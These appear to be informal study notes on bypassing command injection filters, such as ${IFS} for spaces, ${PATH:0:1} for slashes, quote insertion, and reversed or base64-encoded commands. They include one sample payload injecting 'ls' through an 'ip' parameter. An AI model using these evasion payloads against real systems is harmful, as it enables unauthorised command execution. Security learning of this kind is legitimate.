Command Injection methods:

Don’t forget backticks, apparently they do somethin ``` `id` ```

Basically our goal is to figure out which character is not blocked, do not forget to url encode before sending.

  

**IF the space character is blocked**:

we can use tabs - url encoded form
we can use ${IFS}
Can also use brace expansion

We can even use system variables to generate chars. 
For example, if we need a slash and we know that the path variable has a slash, we can try:
echo ${PATH:0:1} (the first char is a slash)

  

Example of finding the user account name: `ip=127.0.0.1%0als${IFS}${PATH:0:1}home`

  

Try to be creative and find different commands to produce similar characters.

  

Accessing linux commands that are blocked

  

You can enter shit between the commands and nux ignores it, for example:

Wh’o’ami works

who$@ami also works

whOamI also works, 

Can write commands backwards and then reverse them: $(rev<<<'imaohw'), or base64 -d``
